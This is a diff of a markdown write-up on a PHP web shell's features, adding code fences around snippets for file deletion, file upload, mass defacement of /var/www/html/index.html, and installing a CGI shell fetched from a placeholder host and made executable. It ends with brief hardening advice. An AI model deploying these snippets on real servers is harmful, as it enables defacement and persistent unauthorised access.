@@ -51,22 +51,25 @@ The web shell presents a user-friendly interface with various functionalities. N
 if (is_file('file.txt')) {
     unlink('file.txt');
 }
-
+```
+```php
 File Upload
 if (isset($_FILES['file'])) {
     move_uploaded_file($_FILES['file']['tmp_name'], 'uploaded_file.txt');
 }
-
+```
 Mass Defacement
+```php
 $deface_file = 'deface.html';
 $target_dir = '/var/www/html/';
 copy($deface_file, $target_dir . 'index.html');
-
+```
 CGI Shell Installation
+```php
 $cgi_code = file_get_contents('https://example.com/cgi_shell.pl');
 file_put_contents('shell.pl', $cgi_code);
 chmod('shell.pl', 0755);
-
+```
 Security Considerations
 Disable Risky PHP Functions: Functions such as exec, shell_exec, and system should be turned off to reduce potential exploits.
 Strict File Upload Controls: Validate all uploads and limit permissions to prevent the execution of harmful scripts.
